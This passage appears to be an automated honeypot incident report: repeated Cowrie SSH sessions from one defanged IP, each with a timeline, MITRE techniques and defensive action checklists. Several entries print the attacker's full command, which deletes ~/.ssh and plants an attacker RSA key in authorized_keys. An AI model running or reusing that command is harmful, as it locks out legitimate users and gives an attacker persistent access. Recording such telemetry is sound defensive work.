| `2026-04-27 12:15:08` | `cowrie.command.input` |
| `2026-04-27 12:15:08` | `cowrie.session.file_download` |
| `2026-04-27 12:15:08` | `cowrie.log.closed` |
| `2026-04-27 12:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4979e5f3bf4e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:15 |
| **Last Seen** | 2026-04-27 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:15:11` | `cowrie.session.connect` |
| `2026-04-27 12:15:11` | `cowrie.client.version` |
| `2026-04-27 12:15:12` | `cowrie.client.kex` |
| `2026-04-27 12:15:13` | `cowrie.login.success` |
| `2026-04-27 12:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e92d5e8bd47

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:16 |
| **Last Seen** | 2026-04-27 12:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:16:10` | `cowrie.session.connect` |
| `2026-04-27 12:16:10` | `cowrie.client.version` |
| `2026-04-27 12:16:10` | `cowrie.client.kex` |
| `2026-04-27 12:16:11` | `cowrie.login.success` |
| `2026-04-27 12:16:12` | `cowrie.session.params` |
| `2026-04-27 12:16:12` | `cowrie.command.input` |
| `2026-04-27 12:16:12` | `cowrie.command.failed` |
| `2026-04-27 12:16:12` | `cowrie.log.closed` |
| `2026-04-27 12:16:13` | `cowrie.session.params` |
| `2026-04-27 12:16:13` | `cowrie.command.input` |
| `2026-04-27 12:16:13` | `cowrie.session.file_download` |
| `2026-04-27 12:16:13` | `cowrie.log.closed` |
| `2026-04-27 12:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff07c6916f4

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:16 |
| **Last Seen** | 2026-04-27 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:16:17` | `cowrie.session.connect` |
| `2026-04-27 12:16:17` | `cowrie.client.version` |
| `2026-04-27 12:16:17` | `cowrie.client.kex` |
| `2026-04-27 12:16:18` | `cowrie.login.success` |
| `2026-04-27 12:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca8377680e8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:17 |
| **Last Seen** | 2026-04-27 12:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:17:16` | `cowrie.session.connect` |
| `2026-04-27 12:17:16` | `cowrie.client.version` |
| `2026-04-27 12:17:16` | `cowrie.client.kex` |
| `2026-04-27 12:17:18` | `cowrie.login.success` |
| `2026-04-27 12:17:18` | `cowrie.session.params` |
| `2026-04-27 12:17:18` | `cowrie.command.input` |
| `2026-04-27 12:17:18` | `cowrie.command.failed` |
| `2026-04-27 12:17:19` | `cowrie.log.closed` |
| `2026-04-27 12:17:19` | `cowrie.session.params` |
| `2026-04-27 12:17:19` | `cowrie.command.input` |
| `2026-04-27 12:17:20` | `cowrie.session.file_download` |
| `2026-04-27 12:17:20` | `cowrie.log.closed` |
| `2026-04-27 12:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-432513e7549f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:17 |
| **Last Seen** | 2026-04-27 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:17:23` | `cowrie.session.connect` |
| `2026-04-27 12:17:23` | `cowrie.client.version` |
| `2026-04-27 12:17:23` | `cowrie.client.kex` |
| `2026-04-27 12:17:24` | `cowrie.login.success` |
| `2026-04-27 12:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56cb6c845a4a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:18 |
| **Last Seen** | 2026-04-27 12:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:18:23` | `cowrie.session.connect` |
| `2026-04-27 12:18:23` | `cowrie.client.version` |
| `2026-04-27 12:18:23` | `cowrie.client.kex` |
| `2026-04-27 12:18:24` | `cowrie.login.success` |
| `2026-04-27 12:18:25` | `cowrie.session.params` |
| `2026-04-27 12:18:25` | `cowrie.command.input` |
| `2026-04-27 12:18:25` | `cowrie.command.failed` |
| `2026-04-27 12:18:25` | `cowrie.log.closed` |
| `2026-04-27 12:18:26` | `cowrie.session.params` |
| `2026-04-27 12:18:26` | `cowrie.command.input` |
| `2026-04-27 12:18:26` | `cowrie.session.file_download` |
| `2026-04-27 12:18:26` | `cowrie.log.closed` |
| `2026-04-27 12:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd38cb71e7b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:18 |
| **Last Seen** | 2026-04-27 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:18:29` | `cowrie.session.connect` |
| `2026-04-27 12:18:29` | `cowrie.client.version` |
| `2026-04-27 12:18:30` | `cowrie.client.kex` |
| `2026-04-27 12:18:31` | `cowrie.login.success` |
| `2026-04-27 12:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6219813b5be6

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:19 |
| **Last Seen** | 2026-04-27 12:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:19:27` | `cowrie.session.connect` |
| `2026-04-27 12:19:27` | `cowrie.client.version` |
| `2026-04-27 12:19:27` | `cowrie.client.kex` |
| `2026-04-27 12:19:28` | `cowrie.login.success` |
| `2026-04-27 12:19:29` | `cowrie.session.params` |
| `2026-04-27 12:19:29` | `cowrie.command.input` |
| `2026-04-27 12:19:29` | `cowrie.command.failed` |
| `2026-04-27 12:19:29` | `cowrie.log.closed` |
| `2026-04-27 12:19:30` | `cowrie.session.params` |
| `2026-04-27 12:19:30` | `cowrie.command.input` |
| `2026-04-27 12:19:30` | `cowrie.session.file_download` |
| `2026-04-27 12:19:30` | `cowrie.log.closed` |
| `2026-04-27 12:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11ae3a2e0340

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:19 |
| **Last Seen** | 2026-04-27 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:19:33` | `cowrie.session.connect` |
| `2026-04-27 12:19:33` | `cowrie.client.version` |
| `2026-04-27 12:19:34` | `cowrie.client.kex` |
| `2026-04-27 12:19:35` | `cowrie.login.success` |
| `2026-04-27 12:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72460edc2a2e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:20 |
| **Last Seen** | 2026-04-27 12:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:20:29` | `cowrie.session.connect` |
| `2026-04-27 12:20:29` | `cowrie.client.version` |
| `2026-04-27 12:20:30` | `cowrie.client.kex` |
| `2026-04-27 12:20:31` | `cowrie.login.success` |
| `2026-04-27 12:20:31` | `cowrie.session.params` |
| `2026-04-27 12:20:31` | `cowrie.command.input` |
| `2026-04-27 12:20:31` | `cowrie.command.failed` |
| `2026-04-27 12:20:32` | `cowrie.log.closed` |
| `2026-04-27 12:20:32` | `cowrie.session.params` |
| `2026-04-27 12:20:32` | `cowrie.command.input` |
| `2026-04-27 12:20:33` | `cowrie.session.file_download` |
| `2026-04-27 12:20:33` | `cowrie.log.closed` |
| `2026-04-27 12:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20a49184d356

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:20 |
| **Last Seen** | 2026-04-27 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:20:36` | `cowrie.session.connect` |
| `2026-04-27 12:20:36` | `cowrie.client.version` |
| `2026-04-27 12:20:36` | `cowrie.client.kex` |
| `2026-04-27 12:20:38` | `cowrie.login.success` |
| `2026-04-27 12:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110269b8fc0b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:21 |
| **Last Seen** | 2026-04-27 12:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:21:32` | `cowrie.session.connect` |
| `2026-04-27 12:21:32` | `cowrie.client.version` |
| `2026-04-27 12:21:32` | `cowrie.client.kex` |
| `2026-04-27 12:21:33` | `cowrie.login.success` |
| `2026-04-27 12:21:34` | `cowrie.session.params` |
| `2026-04-27 12:21:34` | `cowrie.command.input` |
| `2026-04-27 12:21:34` | `cowrie.command.failed` |
| `2026-04-27 12:21:34` | `cowrie.log.closed` |
| `2026-04-27 12:21:35` | `cowrie.session.params` |
| `2026-04-27 12:21:35` | `cowrie.command.input` |
| `2026-04-27 12:21:35` | `cowrie.session.file_download` |
| `2026-04-27 12:21:35` | `cowrie.log.closed` |
| `2026-04-27 12:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa075a74d721

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:21 |
| **Last Seen** | 2026-04-27 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:21:39` | `cowrie.session.connect` |
| `2026-04-27 12:21:39` | `cowrie.client.version` |
| `2026-04-27 12:21:39` | `cowrie.client.kex` |
| `2026-04-27 12:21:40` | `cowrie.login.success` |
| `2026-04-27 12:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4763d6222f6c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:22 |
| **Last Seen** | 2026-04-27 12:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:22:39` | `cowrie.session.connect` |
| `2026-04-27 12:22:39` | `cowrie.client.version` |
| `2026-04-27 12:22:39` | `cowrie.client.kex` |
| `2026-04-27 12:22:40` | `cowrie.login.success` |
| `2026-04-27 12:22:41` | `cowrie.session.params` |
| `2026-04-27 12:22:41` | `cowrie.command.input` |
| `2026-04-27 12:22:41` | `cowrie.command.failed` |
| `2026-04-27 12:22:41` | `cowrie.log.closed` |
| `2026-04-27 12:22:42` | `cowrie.session.params` |
| `2026-04-27 12:22:42` | `cowrie.command.input` |
| `2026-04-27 12:22:42` | `cowrie.session.file_download` |
| `2026-04-27 12:22:42` | `cowrie.log.closed` |
| `2026-04-27 12:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b02413950e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:22 |
| **Last Seen** | 2026-04-27 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:22:46` | `cowrie.session.connect` |
| `2026-04-27 12:22:46` | `cowrie.client.version` |
| `2026-04-27 12:22:46` | `cowrie.client.kex` |
| `2026-04-27 12:22:47` | `cowrie.login.success` |
| `2026-04-27 12:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b067b9ca70

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:23 |
| **Last Seen** | 2026-04-27 12:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:23:50` | `cowrie.session.connect` |
| `2026-04-27 12:23:50` | `cowrie.client.version` |
| `2026-04-27 12:23:50` | `cowrie.client.kex` |
| `2026-04-27 12:23:51` | `cowrie.login.success` |
| `2026-04-27 12:23:52` | `cowrie.session.params` |
| `2026-04-27 12:23:52` | `cowrie.command.input` |
| `2026-04-27 12:23:52` | `cowrie.command.failed` |
| `2026-04-27 12:23:52` | `cowrie.log.closed` |
| `2026-04-27 12:23:53` | `cowrie.session.params` |
| `2026-04-27 12:23:53` | `cowrie.command.input` |
| `2026-04-27 12:23:53` | `cowrie.session.file_download` |
| `2026-04-27 12:23:53` | `cowrie.log.closed` |
| `2026-04-27 12:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02824bb75912

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:23 |
| **Last Seen** | 2026-04-27 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:23:57` | `cowrie.session.connect` |
| `2026-04-27 12:23:57` | `cowrie.client.version` |
| `2026-04-27 12:23:57` | `cowrie.client.kex` |
| `2026-04-27 12:23:58` | `cowrie.login.success` |
| `2026-04-27 12:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6efd800d565d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:24 |
| **Last Seen** | 2026-04-27 12:25 |
| **Session Duration** | 8s |
